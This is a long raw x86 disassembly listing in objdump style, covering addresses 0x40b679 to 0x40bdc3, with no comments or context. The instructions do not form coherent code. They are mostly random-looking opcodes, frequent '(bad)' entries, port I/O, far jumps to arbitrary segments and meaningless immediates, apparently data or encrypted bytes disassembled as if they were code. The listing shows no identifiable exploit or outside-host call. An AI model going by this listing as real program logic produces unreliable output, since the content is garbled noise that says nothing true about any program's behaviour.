  40b679:	jge    0x40b6dd
  40b67b:	sti    
  40b67c:	dec    esp
  40b67d:	cwde   
  40b67e:	dec    ebx
  40b67f:	dec    edi
  40b680:	and    eax,0x1cb71bfc
  40b685:	jle    0x40b68c
  40b687:	dec    ebp
  40b688:	(bad)  
  40b689:	push   esi
  40b68a:	cmp    al,0xe0
  40b68c:	pusha  
  40b68d:	push   0xe0c17b54
  40b692:	inc    esi
  40b693:	cdq    
  40b694:	jns    0x40b650
  40b696:	or     ebp,DWORD PTR [ebp-0x381483ba]
  40b69c:	repnz scas eax,DWORD PTR es:[edi]
  40b69e:	je     0x40b62f
  40b6a0:	and    eax,0x43ee7db1
  40b6a5:	and    dl,cl
  40b6a7:	pop    ebx
  40b6a8:	jnp    0x40b700
  40b6aa:	int3   
  40b6ab:	inc    ecx
  40b6ac:	lock pop ecx
  40b6ae:	pop    esi
  40b6af:	pop    es
  40b6b0:	jo     0x40b671
  40b6b2:	test   al,0xfc
  40b6b4:	add    ebp,DWORD PTR [ebp-0xba1c49]
  40b6ba:	jb     0x40b694
  40b6bc:	cdq    
  40b6bd:	pop    es
  40b6be:	or     bl,BYTE PTR [esi-0x7779b5d6]
  40b6c4:	mov    ebp,0x6083de89
  40b6c9:	jl     0x40b68a
  40b6cb:	mov    ebx,ebx
  40b6cd:	gs pop ecx
  40b6cf:	fst    QWORD PTR [eax-0x77702c51]
  40b6d5:	fbstp  TBYTE PTR [ecx]
  40b6d7:	(bad)  
  40b6d8:	icebp  
  40b6d9:	dec    ecx
  40b6da:	into   
  40b6db:	repnz pop ss
  40b6dd:	(bad)  
  40b6de:	and    ebp,esp
  40b6e0:	jne    0x40b740
  40b6e2:	rol    DWORD PTR [edx+0x28c52a3e],0x46
  40b6e9:	jmp    0x554a3976
  40b6ee:	fbld   TBYTE PTR [edx+0x1b68e138]
  40b6f4:	pusha  
  40b6f5:	pop    ebx
  40b6f6:	push   ebp
  40b6f7:	push   esp
  40b6f8:	loopne 0x40b6e4
  40b6fa:	test   DWORD PTR gs:[edi-0x5a666b3b],ebp
  40b701:	mov    cl,0xd9
  40b703:	pop    eax
  40b704:	adc    bh,al
  40b706:	push   esp
  40b707:	sbb    ah,BYTE PTR [edx-0x62a9b670]
  40b70d:	shl    bl,1
  40b70f:	sub    ch,BYTE PTR [ebp+0x25a98fec]
  40b715:	fld    DWORD PTR [edi+0x38]
  40b718:	jmp    0x40b781
  40b71a:	xor    al,0xad
  40b71c:	cmp    BYTE PTR [edx+0x7c],ch
  40b71f:	xor    al,BYTE PTR [ecx-0x62]
  40b722:	mov    gs,edx
  40b724:	(bad)  
  40b725:	mov    eax,ds:0xc49830f9
  40b72a:	aam    0xfc
  40b72c:	and    DWORD PTR [eax+ebp*4-0x75],edx
  40b730:	lock in al,dx
  40b732:	add    eax,0xba20bb5
  40b737:	stc    
  40b738:	ret    
  40b739:	adc    BYTE PTR [esi],bl
  40b73b:	add    DWORD PTR [edi-0x4d],ecx
  40b73e:	inc    esp
  40b73f:	test   al,0xa7
  40b741:	add    ecx,esi
  40b743:	fsubr  DWORD PTR [ebx+0x17]
  40b746:	test   BYTE PTR [ebp+0x7acb971f],bh
  40b74c:	sbb    BYTE PTR [edx+0x36],bl
  40b74f:	mov    ds:0x884ad8b7,eax
  40b754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b755:	jmp    0x596d66e8
  40b75a:	xchg   edx,eax
  40b75b:	aam    0x48
  40b75d:	lahf   
  40b75e:	or     dh,BYTE PTR [esp+ebp*1+0x31]
  40b762:	jmp    0xbf2:0x54107018
  40b769:	rcl    DWORD PTR [edi-0x10a75dab],1
  40b76f:	in     eax,0xc9
  40b771:	ror    BYTE PTR [ebx+0x72],cl
  40b774:	and    ah,ah
  40b776:	add    BYTE PTR [ebx-0x3f7ae034],0xdf
  40b77d:	push   cs
  40b77e:	mov    dh,0x67
  40b780:	cmp    esp,DWORD PTR [ebx+0x154bad55]
  40b786:	and    dh,BYTE PTR [bx]
  40b789:	outs   dx,BYTE PTR ds:[esi]
  40b78a:	mov    ebx,0xc71e0145
  40b78f:	outs   dx,BYTE PTR ds:[esi]
  40b790:	and    BYTE PTR [esi],bl
  40b792:	in     al,dx
  40b793:	imul   edx,DWORD PTR [esi],0x2d
  40b796:	ds dec esi
  40b798:	mov    edx,0x3cc65b05
  40b79d:	fadd   st,st(5)
  40b79f:	mov    WORD PTR [edi*8-0x79037100],?
  40b7a6:	lds    edi,FWORD PTR [ecx+ebp*2+0x3d]
  40b7aa:	or     eax,0xb0afce95
  40b7af:	inc    edi
  40b7b0:	xlat   BYTE PTR ss:[ebx]
  40b7b2:	jle    0x40b76f
  40b7b4:	push   ds
  40b7b5:	ds out dx,al
  40b7b7:	cmc    
  40b7b8:	scas   eax,DWORD PTR es:[edi]
  40b7b9:	pop    edx
  40b7ba:	xchg   ecx,eax
  40b7bb:	jge    0x40b7d5
  40b7bd:	cs push ebp
  40b7bf:	aad    0x10
  40b7c1:	sti    
  40b7c2:	push   ds
  40b7c3:	xor    BYTE PTR [eax+0x4f],dh
  40b7c6:	add    eax,0x1ccd2699
  40b7cb:	add    ch,BYTE PTR [edx-0x7e]
  40b7ce:	data16 sub al,0xfb
  40b7d1:	int    0x0
  40b7d3:	xlat   BYTE PTR ds:[ebx]
  40b7d4:	dec    ebp
  40b7d5:	mov    ebx,0xa5d1e39f
  40b7da:	and    dl,BYTE PTR [ebp+0x6f]
  40b7dd:	jl     0x40b7be
  40b7df:	mov    ecx,0x19c13188
  40b7e4:	or     ecx,eax
  40b7e6:	sbb    ch,BYTE PTR [ebx+0x76]
  40b7e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7ea:	push   ebp
  40b7eb:	adc    eax,0xc6959f45
  40b7f0:	ins    BYTE PTR es:[edi],dx
  40b7f1:	shl    ch,1
  40b7f3:	inc    ebx
  40b7f4:	rcr    al,cl
  40b7f6:	lahf   
  40b7f7:	sub    ecx,DWORD PTR [edx]
  40b7f9:	add    DWORD PTR [ebp-0x5bc345ea],edx
  40b7ff:	add    BYTE PTR [esi],cl
  40b801:	xchg   ebx,eax
  40b802:	add    DWORD PTR [esi-0x4b],edx
  40b805:	cmp    eax,ebx
  40b807:	cwde   
  40b808:	bound  edi,QWORD PTR [ecx-0x27]
  40b80b:	test   BYTE PTR [edx-0x13ebcd88],0xe2
  40b812:	scas   al,BYTE PTR es:[edi]
  40b813:	adc    BYTE PTR [ebp-0x21],dh
  40b816:	push   0xffffffe6
  40b818:	arpl   WORD PTR [edi-0x4bf97aa0],cx
  40b81e:	fiadd  DWORD PTR ds:0x8cb31f57
  40b824:	or     BYTE PTR [ebx-0x13a95290],dh
  40b82a:	sub    edi,DWORD PTR [edx+0x57]
  40b82d:	in     al,dx
  40b82e:	lods   al,BYTE PTR ds:[esi]
  40b82f:	xor    BYTE PTR [ebx],ch
  40b831:	sti    
  40b832:	dec    ebx
  40b833:	mov    BYTE PTR [eax-0x7a36c7bc],bl
  40b839:	inc    eax
  40b83a:	fdiv   DWORD PTR [edx]
  40b83c:	inc    edi
  40b83d:	js     0x40b8af
  40b83f:	mov    ecx,0x5572e9c3
  40b844:	mov    BYTE PTR [esp+ebx*8-0x57],dl
  40b848:	dec    edx
  40b849:	int    0x1e
  40b84b:	mov    ecx,DWORD PTR [esi*1-0x1c107768]
  40b852:	inc    eax
  40b853:	xchg   esp,eax
  40b854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b855:	push   ss
  40b856:	pop    edi
  40b857:	inc    edx
  40b858:	and    al,0xb0
  40b85a:	push   ss
  40b85b:	and    dl,0x68
  40b85e:	push   0xa176abe1
  40b863:	outs   dx,BYTE PTR cs:[esi]
  40b865:	fwait
  40b866:	and    eax,0xfaa3aa0b
  40b86b:	cmp    al,0xc0
  40b86d:	les    ecx,FWORD PTR [esp+eiz*2-0x643d2d8]
  40b874:	dec    eax
  40b875:	xlat   BYTE PTR ds:[ebx]
  40b876:	out    dx,al
  40b877:	sti    
  40b878:	sub    al,0x9b
  40b87a:	and    eax,0xc5716ba
  40b87f:	(bad)  
  40b880:	fnstenv [edx+0x51a4c3eb]
  40b886:	mov    edi,DWORD PTR [eax-0x6d301cfc]
  40b88c:	mov    edx,0xc06f6ea7
  40b891:	test   DWORD PTR [edx-0x1ec974e2],0xc3ddbf19
  40b89b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b89c:	in     eax,0x9
  40b89e:	xor    al,0xf1
  40b8a0:	in     eax,0xfe
  40b8a2:	xchg   ecx,eax
  40b8a3:	std    
  40b8a4:	jno    0x40b91d
  40b8a6:	cmc    
  40b8a7:	dec    esp
  40b8a8:	gs pop esi
  40b8aa:	mov    al,ds:0x3a5baa80
  40b8af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8b0:	cmp    eax,0x957ecbc1
  40b8b5:	inc    esp
  40b8b6:	or     ch,BYTE PTR [ebp-0x3]
  40b8b9:	inc    ebp
  40b8ba:	jae    0x40b8a3
  40b8bc:	sub    bh,cl
  40b8be:	push   0x97b8babc
  40b8c3:	nop
  40b8c4:	mov    ah,0x5b
  40b8c6:	mov    cl,BYTE PTR [eax+0x61d59236]
  40b8cc:	(bad)  
  40b8cd:	pop    esi
  40b8ce:	mov    eax,0x3a395da1
  40b8d3:	addr16 int 0xed
  40b8d6:	stos   DWORD PTR es:[edi],eax
  40b8d7:	mov    ecx,0x9f75a422
  40b8dc:	sbb    ah,al
  40b8de:	push   esp
  40b8df:	int    0x8c
  40b8e1:	scas   eax,DWORD PTR es:[edi]
  40b8e2:	lods   eax,DWORD PTR ds:[esi]
  40b8e3:	xchg   esi,eax
  40b8e4:	das    
  40b8e5:	test   eax,edi
  40b8e7:	add    dh,al
  40b8e9:	dec    edi
  40b8ea:	rcr    dh,0x32
  40b8ed:	add    edi,eax
  40b8ef:	sub    BYTE PTR [esi],cl
  40b8f1:	rcr    BYTE PTR [esi],0x4c
  40b8f4:	iret   
  40b8f5:	sti    
  40b8f6:	in     al,0xfc
  40b8f8:	std    
  40b8f9:	mov    dh,0x11
  40b8fb:	test   DWORD PTR ds:[ebx-0x71],0xfc4ed448
  40b903:	push   es
  40b904:	aas    
  40b905:	jmp    0x40b8df
  40b907:	test   eax,0xd336ad27
  40b90c:	cli    
  40b90d:	mov    BYTE PTR ds:0xbd1bf40b,bh
  40b913:	pop    esi
  40b914:	dec    eax
  40b915:	push   edx
  40b916:	inc    edi
  40b917:	shl    DWORD PTR [ebx+0x5ae115c6],0x5c
  40b91e:	icebp  
  40b91f:	call   0xe785:0x83a197b2
  40b926:	test   al,0x5a
  40b928:	arpl   WORD PTR [ebp+ebx*8+0x6b],dx
  40b92c:	mov    edx,0x165a5ba0
  40b931:	fisttp WORD PTR [edx]
  40b933:	add    eax,0xc29f160e
  40b938:	daa    
  40b939:	and    cl,0xaf
  40b93c:	pop    ss
  40b93d:	jne    0x40b8e1
  40b93f:	jns    0x40b967
  40b941:	cmp    edi,edx
  40b943:	mov    al,ds:0xcd6f6b0b
  40b948:	les    ebp,FWORD PTR [ecx]
  40b94a:	mov    ch,cl
  40b94c:	(bad)  
  40b94e:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40b950:	sub    ecx,DWORD PTR [ecx+0x6943e89d]
  40b956:	scas   eax,DWORD PTR es:[edi]
  40b957:	add    DWORD PTR [ebx-0x43],ecx
  40b95a:	clc    
  40b95b:	shr    DWORD PTR [ebx],0xea
  40b95e:	dec    ebx
  40b95f:	pop    ds
  40b960:	inc    ebp
  40b961:	scas   eax,DWORD PTR es:[edi]
  40b962:	cs mov ebp,0x4cdc2534
  40b968:	push   ds
  40b969:	jg     0x40b9a6
  40b96b:	arpl   WORD PTR [ebx],dx
  40b96d:	add    esi,DWORD PTR [edi-0x7b]
  40b970:	sbb    eax,0x13595aa7
  40b975:	cld    
  40b976:	jo     0x40b967
  40b978:	fwait
  40b979:	adc    al,0xde
  40b97b:	mov    eax,DWORD PTR [esi+0x5b]
  40b97e:	std    
  40b97f:	adc    ebx,eax
  40b981:	jno    0x40b993
  40b983:	inc    ebx
  40b984:	pop    ecx
  40b985:	cmp    eax,0x35b26979
  40b98a:	outs   dx,BYTE PTR ds:[esi]
  40b98b:	mov    edi,0xbb92d584
  40b990:	xchg   edx,eax
  40b991:	aam    0x9a
  40b993:	ins    DWORD PTR es:[edi],dx
  40b994:	mov    esp,0xd29d69b0
  40b999:	xor    DWORD PTR [edx+0x1b],edi
  40b99c:	lea    cx,[ecx]
  40b99f:	fimul  DWORD PTR ds:0xc7444d1f
  40b9a5:	int    0x26
  40b9a7:	jo     0x40b9e0
  40b9a9:	mov    ah,0xa9
  40b9ab:	fldl2e 
  40b9ad:	in     al,dx
  40b9ae:	leave  
  40b9af:	mov    esp,0x4a613a65
  40b9b4:	lea    eax,[ebp-0x5fe4e835]
  40b9ba:	ja     0x40b9f7
  40b9bc:	jecxz  0x40b943
  40b9be:	pusha  
  40b9bf:	or     BYTE PTR [edi+ebp*8+0x4e],bl
  40b9c3:	lahf   
  40b9c4:	xor    ah,BYTE PTR [edi-0x5f703710]
  40b9ca:	dec    eax
  40b9cb:	sub    bh,BYTE PTR [edi+0x53]
  40b9ce:	xchg   DWORD PTR [eax+0x37],edi
  40b9d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9d2:	arpl   WORD PTR [ecx],ax
  40b9d4:	enter  0x61a9,0xf2
  40b9d8:	mov    al,0x1e
  40b9da:	test   eax,0x4f46e918
  40b9df:	rcr    BYTE PTR [edx-0x3a796d22],1
  40b9e5:	xchg   BYTE PTR [ebx-0x7e],ah
  40b9e8:	imul   edx,DWORD PTR [esi],0x23
  40b9eb:	cmp    esp,ebp
  40b9ed:	(bad)  [esi+0x2]
  40b9f0:	lock ficom WORD PTR [ebx-0x5172bfd4]
  40b9f7:	out    0xbf,eax
  40b9f9:	stc    
  40b9fa:	dec    ebx
  40b9fb:	inc    esi
  40b9fc:	(bad)  
  40b9fd:	ins    BYTE PTR es:[edi],dx
  40b9fe:	xchg   BYTE PTR [edx],dl
  40ba00:	fld    QWORD PTR [esi+0x43]
  40ba03:	outs   dx,DWORD PTR ds:[esi]
  40ba04:	pop    ebp
  40ba05:	sbb    eax,0x9be015b4
  40ba0a:	sahf   
  40ba0b:	(bad)  
  40ba0c:	call   0x2315:0xc1a163ed
  40ba13:	or     BYTE PTR [esi],0x43
  40ba16:	mov    ch,0xa2
  40ba18:	cmp    BYTE PTR [esi-0x50],0xd4
  40ba1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba1d:	rol    DWORD PTR [edi+ecx*8+0x1c19dc56],cl
  40ba24:	jne    0x40b9b6
  40ba26:	or     BYTE PTR [ebp+0x1c],ah
  40ba29:	ret    
  40ba2a:	ja     0x40ba9d
  40ba2c:	push   ecx
  40ba2d:	dec    edx
  40ba2e:	xchg   edx,eax
  40ba2f:	loope  0x40ba5f
  40ba31:	rcr    DWORD PTR [ecx],0xb8
  40ba34:	ret    0x67ca
  40ba37:	mov    ebx,0xe2349e4a
  40ba3c:	ja     0x40ba6d
  40ba3e:	js     0x40ba88
  40ba40:	test   DWORD PTR [ecx+0xc4b1c5c],edi
  40ba46:	push   ss
  40ba47:	jns    0x40ba36
  40ba49:	xchg   edx,eax
  40ba4a:	fwait
  40ba4b:	stc    
  40ba4c:	call   0xdc063022
  40ba51:	jmp    0x5470b463
  40ba56:	jp     0x40ba8f
  40ba58:	mov    al,ds:0x4beb48cf
  40ba5d:	(bad)  
  40ba5e:	or     eax,0x64d5643f
  40ba63:	adc    al,ch
  40ba65:	gs cs test al,0x52
  40ba69:	sbb    esp,DWORD PTR [edx+0x77]
  40ba6c:	or     al,0x83
  40ba6e:	js     0x40ba49
  40ba70:	mov    ?,WORD PTR [edx-0x2327817e]
  40ba76:	xor    ecx,eax
  40ba78:	ins    DWORD PTR es:[edi],dx
  40ba79:	inc    ecx
  40ba7a:	je     0x40bacf
  40ba7c:	push   esp
  40ba7d:	cmp    ecx,DWORD PTR [ebx+0x65]
  40ba80:	call   0x3abf0831
  40ba85:	iret   
  40ba86:	cdq    
  40ba87:	lock add al,0xbc
  40ba8a:	mul    DWORD PTR [ecx+0x2a]
  40ba8d:	leave  
  40ba8e:	(bad)  
  40ba8f:	loopne 0x40ba49
  40ba91:	(bad)  
  40ba93:	stos   BYTE PTR es:[edi],al
  40ba94:	loope  0x40bb07
  40ba96:	sbb    ah,bh
  40ba98:	das    
  40ba99:	jne    0x40ba40
  40ba9b:	inc    ebp
  40ba9c:	mov    ds:0x6b83006,eax
  40baa1:	or     ch,BYTE PTR [edi]
  40baa3:	sbb    esp,DWORD PTR [ecx+edx*2]
  40baa6:	in     eax,dx
  40baa7:	cmp    esi,0xb6380ae2
  40baad:	xchg   ax,ax
  40baaf:	xchg   ecx,eax
  40bab0:	mov    esi,0x5d3dbdbf
  40bab5:	lock mov eax,0xac5bf3f7
  40babb:	in     eax,0xb6
  40babd:	push   esp
  40babe:	retf   
  40babf:	mov    ch,BYTE PTR [edx]
  40bac1:	les    edx,FWORD PTR [ebx]
  40bac3:	fld    TBYTE PTR [esi-0x3ddda5cf]
  40bac9:	sub    edi,0xd1e92556
  40bacf:	out    dx,eax
  40bad0:	sbb    DWORD PTR [edi],ebx
  40bad2:	inc    eax
  40bad3:	mov    ebx,0xe15745e4
  40bad8:	mov    esi,esi
  40bada:	mul    BYTE PTR [eax+0x68]
  40badd:	or     ecx,ebp
  40badf:	mov    al,ds:0x55a77b73
  40bae4:	inc    esp
  40bae5:	enter  0x5e57,0xde
  40bae9:	xor    al,0x33
  40baeb:	in     al,dx
  40baec:	cmp    ebp,DWORD PTR [ecx+0x5a776cf6]
  40baf2:	jb     0x40bae9
  40baf4:	push   edi
  40baf5:	ja     0x40bb41
  40baf7:	dec    edi
  40baf8:	cmp    eax,0x3d4ec4e
  40bafd:	add    DWORD PTR [eax],ecx
  40baff:	outs   dx,DWORD PTR ds:[esi]
  40bb00:	jno    0x40ba92
  40bb02:	retf   0x7e54
  40bb05:	cmc    
  40bb06:	mov    DWORD PTR [esi+0x7c],esp
  40bb09:	clc    
  40bb0a:	enterw 0xdba0,0xbe
  40bb0f:	inc    edi
  40bb10:	neg    dl
  40bb12:	jecxz  0x40babe
  40bb14:	popa   
  40bb15:	or     DWORD PTR [ebp-0x1a],esi
  40bb18:	add    ecx,DWORD PTR [edx-0x108f5107]
  40bb1e:	dec    ebp
  40bb1f:	push   eax
  40bb20:	jb     0x40bacd
  40bb22:	pop    ebp
  40bb23:	adc    cl,BYTE PTR [ebp+edi*8-0x2c]
  40bb27:	dec    esi
  40bb28:	stc    
  40bb29:	add    BYTE PTR [ebx-0x31],bh
  40bb2c:	fist   WORD PTR [edx+0x7e]
  40bb2f:	and    bh,BYTE PTR [ebp-0x49ea9af8]
  40bb35:	cmp    al,BYTE PTR [ecx+0x7851cf0d]
  40bb3b:	pop    edi
  40bb3c:	jbe    0x40bb11
  40bb3e:	mov    ds:0x2c12bd22,eax
  40bb43:	push   0x115119da
  40bb48:	out    0xe,al
  40bb4a:	jb     0x40bae4
  40bb4c:	dec    ecx
  40bb4d:	xchg   ecx,eax
  40bb4e:	pop    ebx
  40bb4f:	and    esp,ebx
  40bb51:	sub    dl,BYTE PTR [ebx-0x3a507d98]
  40bb57:	jecxz  0x40bb17
  40bb59:	mov    fs,WORD PTR [edi]
  40bb5b:	cmc    
  40bb5c:	daa    
  40bb5d:	add    DWORD PTR [esi-0x41],esp
  40bb60:	sqrtps xmm3,xmm6
  40bb63:	mov    bh,0x22
  40bb65:	sahf   
  40bb66:	mov    bh,0x9c
  40bb68:	scas   eax,DWORD PTR es:[edi]
  40bb69:	cmp    BYTE PTR [eax+0x25b36cc7],al
  40bb6f:	add    ch,al
  40bb71:	pushf  
  40bb72:	in     eax,dx
  40bb73:	(bad)  
  40bb74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb75:	mov    ebp,0x5b385eca
  40bb7a:	leave  
  40bb7b:	push   cs
  40bb7c:	mov    fs,WORD PTR [esi+0x13b2abf6]
  40bb82:	sub    BYTE PTR [esi],0x3b
  40bb85:	loop   0x40bbcf
  40bb87:	in     al,0xc9
  40bb89:	in     al,dx
  40bb8a:	pop    ecx
  40bb8b:	or     ch,BYTE PTR [esi+0x54]
  40bb8e:	pop    eax
  40bb8f:	xor    al,0xae
  40bb91:	sub    dh,bh
  40bb93:	pop    esi
  40bb94:	fstp   QWORD PTR [eax+ecx*1+0x376a8347]
  40bb9b:	add    DWORD PTR [edx+0x0],0xffffffa7
  40bb9f:	out    dx,al
  40bba0:	xor    DWORD PTR [edi+0x3e],ecx
  40bba3:	inc    ebx
  40bba4:	(bad)  
  40bba5:	adc    al,ah
  40bba7:	mov    cl,0xb8
  40bba9:	sahf   
  40bbaa:	ds push esp
  40bbac:	xor    eax,0x6ba1b5f3
  40bbb1:	ds jl  0x40bbc1
  40bbb4:	pop    esp
  40bbb5:	into   
  40bbb6:	pop    esp
  40bbb7:	mov    BYTE PTR [ebx],cl
  40bbb9:	inc    edi
  40bbba:	sti    
  40bbbb:	sbb    dh,BYTE PTR [edi+0x3b]
  40bbbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbbf:	cmp    al,0x3b
  40bbc1:	cmp    esi,edx
  40bbc3:	mov    esi,0x367f3be4
  40bbc8:	inc    eax
  40bbc9:	jg     0x40bbd2
  40bbcb:	out    dx,eax
  40bbcc:	inc    eax
  40bbcd:	pop    ebx
  40bbce:	push   ds
  40bbcf:	mov    ds:0x4b5dba1e,al
  40bbd4:	fld    TBYTE PTR [ebp-0x666a3357]
  40bbda:	cmc    
  40bbdb:	jle    0x40bb92
  40bbdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbde:	mov    edx,0x84dfe440
  40bbe3:	shl    BYTE PTR [esi+0x31b9a8ef],0xc8
  40bbea:	inc    ecx
  40bbec:	std    
  40bbed:	jp     0x40bba4
  40bbef:	jnp    0x40bb9d
  40bbf1:	aad    0x28
  40bbf3:	adc    eax,0x6a8bd07b
  40bbf8:	(bad)  
  40bbf9:	call   DWORD PTR [ebx+0x2a8f6597]
  40bbff:	and    ebx,DWORD PTR [ebx+0x6a]
  40bc02:	mov    eax,0x992c0ba8
  40bc07:	xlat   BYTE PTR ds:[ebx]
  40bc08:	(bad)  
  40bc0a:	inc    esi
  40bc0b:	cld    
  40bc0c:	test   BYTE PTR [ebx-0x14],ch
  40bc0f:	xor    eax,0x86be23f
  40bc14:	sbb    eax,0xb329710b
  40bc19:	add    al,0x12
  40bc1b:	mov    al,ds:0x7ccbf225
  40bc20:	pop    esp
  40bc21:	jnp    0x40bc31
  40bc23:	push   eax
  40bc24:	adc    ah,BYTE PTR [eax]
  40bc26:	(bad)  
  40bc27:	mov    eax,0x45d261c4
  40bc2c:	pop    esp
  40bc2d:	sub    BYTE PTR [esi+0x13],cl
  40bc30:	jmp    0xb5ea:0xa4fbe28b
  40bc37:	test   ebp,edi
  40bc39:	inc    esi
  40bc3a:	or     eax,0x58d8d11c
  40bc3f:	mov    ebp,0xf1174fe1
  40bc44:	jp     0x40bc30
  40bc46:	xor    DWORD PTR [ebp+0x49],ebx
  40bc49:	ins    BYTE PTR es:[edi],dx
  40bc4a:	fisttp QWORD PTR [edi-0x6389010a]
  40bc50:	nop
  40bc51:	scas   eax,DWORD PTR es:[edi]
  40bc52:	or     al,0x0
  40bc54:	cmp    al,0x91
  40bc56:	or     DWORD PTR [ecx],ebp
  40bc58:	jle    0x40bc89
  40bc5a:	nop
  40bc5b:	sub    DWORD PTR [esi],ebx
  40bc5d:	xchg   dh,ah
  40bc5f:	rcl    edi,cl
  40bc61:	push   ebx
  40bc62:	inc    ebx
  40bc63:	js     0x40bc65
  40bc65:	push   eax
  40bc66:	ret    0xc050
  40bc69:	leave  
  40bc6a:	dec    ebp
  40bc6b:	fcmove st,st(4)
  40bc6d:	(bad)
  40bc70:	aas    
  40bc71:	pushf  
  40bc72:	push   ecx
  40bc73:	(bad)  
  40bc74:	bound  ecx,QWORD PTR [esi+0x3ea665d1]
  40bc7a:	ds xor eax,DWORD PTR ss:[eax+0x53ffea8e]
  40bc82:	dec    ebx
  40bc83:	popa   
  40bc84:	pop    ss
  40bc85:	sbb    esi,DWORD PTR [esi-0x6742300]
  40bc8b:	adc    ebp,DWORD PTR [esi]
  40bc8d:	push   ds
  40bc8e:	jae    0x40bce6
  40bc90:	sar    BYTE PTR [ebx],1
  40bc92:	xchg   ebx,eax
  40bc93:	iret   
  40bc94:	sbb    BYTE PTR [esi],0xc1
  40bc97:	dec    esp
  40bc98:	mov    ss,WORD PTR es:[ecx]
  40bc9b:	(bad)  
  40bc9d:	mov    ch,0x30
  40bc9f:	or     al,0x89
  40bca1:	cs out dx,eax
  40bca3:	xor    BYTE PTR [edi],bl
  40bca5:	xchg   esp,eax
  40bca6:	sahf   
  40bca7:	sbb    DWORD PTR ds:0x1bc13eb7,ebp
  40bcad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcae:	sbb    edx,eax
  40bcb0:	push   ebx
  40bcb1:	repnz mov ecx,0xc44c9a1d
  40bcb7:	push   es
  40bcb8:	int3   
  40bcb9:	daa    
  40bcba:	dec    esp
  40bcbb:	enter  0x61d3,0x7a
  40bcbf:	je     0x40bcd2
  40bcc1:	outs   dx,DWORD PTR ds:[esi]
  40bcc2:	lds    esi,FWORD PTR [edx+0x7c]
  40bcc5:	mov    WORD PTR [eax],ds
  40bcc7:	gs pop esp
  40bcc9:	sub    bl,BYTE PTR ds:[edx-0xc65512]
  40bcd0:	loopne 0x40bd51
  40bcd2:	jmp    0x3693:0x583be553
  40bcd9:	popf   
  40bcda:	push   ds
  40bcdb:	xor    edi,DWORD PTR [ebx]
  40bcdd:	and    DWORD PTR [ebp+0x7260ed93],ebx
  40bce3:	xor    eax,DWORD PTR [ecx-0x78]
  40bce6:	xor    bh,BYTE PTR [eax-0x1a]
  40bce9:	in     al,dx
  40bcea:	stc    
  40bceb:	test   BYTE PTR [ebp+0x1d],ch
  40bcee:	jae    0x40bd15
  40bcf0:	dec    ebx
  40bcf1:	inc    eax
  40bcf2:	and    DWORD PTR [edi-0x7b],ebx
  40bcf5:	pop    ecx
  40bcf6:	cdq    
  40bcf7:	loopne 0x40bca0
  40bcf9:	out    dx,al
  40bcfa:	xor    eax,0x141e2f6e
  40bcff:	(bad)  
  40bd00:	iret   
  40bd01:	int    0xf1
  40bd03:	(bad)  
  40bd05:	mov    edx,0xc5526320
  40bd0a:	inc    edx
  40bd0b:	fcmove st,st(6)
  40bd0d:	scas   eax,DWORD PTR es:[edi]
  40bd0e:	cdq    
  40bd0f:	int    0x1c
  40bd11:	aaa    
  40bd12:	mul    DWORD PTR [esi+ecx*8-0x1]
  40bd16:	ss loope 0x40bce5
  40bd19:	data16 (bad) 
  40bd1b:	jmp    0x40bd94
  40bd1d:	test   BYTE PTR [eax+0x1],ch
  40bd20:	call   0xb28d:0xa8761f12
  40bd27:	xor    al,0x45
  40bd29:	fisttp QWORD PTR [esi]
  40bd2b:	add    eax,edi
  40bd2d:	mov    DWORD PTR [ecx-0x56],ebp
  40bd30:	xchg   edx,eax
  40bd31:	mov    ecx,0x3959be3a
  40bd36:	and    al,0x3
  40bd38:	cmp    bh,BYTE PTR ds:0xc496abda
  40bd3e:	retf   
  40bd3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd40:	add    BYTE PTR [eax-0x74],0x4e
  40bd44:	jmp    0xc9bd2110
  40bd49:	mov    ch,0x62
  40bd4b:	je     0x40bd4e
  40bd4d:	pop    esi
  40bd4e:	inc    ecx
  40bd4f:	test   BYTE PTR [esi],bl
  40bd51:	retf   0x2c61
  40bd54:	sub    al,0xdb
  40bd56:	fsubr  QWORD PTR [ecx]
  40bd58:	xchg   BYTE PTR [ebp-0x56fdf237],al
  40bd5e:	sub    ebx,DWORD PTR ds:0x23039dc1
  40bd64:	add    eax,0x4c4efbce
  40bd69:	scas   al,BYTE PTR es:[edi]
  40bd6a:	shr    ebx,1
  40bd6c:	(bad)  
  40bd6e:	mov    ebx,0xf48e6293
  40bd73:	and    al,0xd
  40bd75:	sub    DWORD PTR [ecx],ebx
  40bd77:	es mov bh,bl
  40bd7a:	mov    cs,ecx
  40bd7c:	add    dl,BYTE PTR [ebx+0x59505c90]
  40bd82:	ds jns 0x40bd4e
  40bd85:	js     0x40bdd9
  40bd87:	mov    ecx,0x453781f
  40bd8c:	mov    ebp,0x66363d95
  40bd91:	cmp    edi,DWORD PTR [ebx-0x57bb113f]
  40bd97:	retf   
  40bd98:	popa   
  40bd99:	jnp    0x40bd7d
  40bd9b:	fisub  DWORD PTR cs:[edx+0x9]
  40bd9f:	sbb    eax,0xb1c927e4
  40bda4:	aad    0xe2
  40bda6:	and    esp,edx
  40bda8:	and    dh,dh
  40bdaa:	es push ss
  40bdac:	xchg   DWORD PTR [ebx+0x68],edx
  40bdaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdb0:	lods   al,BYTE PTR ds:[esi]
  40bdb1:	mov    ah,0x25
  40bdb3:	xor    ch,BYTE PTR [ebx-0x7951d5a8]
  40bdb9:	jmp    0xce0113c7
  40bdbe:	hlt    
  40bdbf:	xlat   BYTE PTR ds:[ebx]
  40bdc0:	lods   eax,DWORD PTR ds:[esi]
  40bdc1:	xchg   edx,eax
  40bdc2:	cmc    
  40bdc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
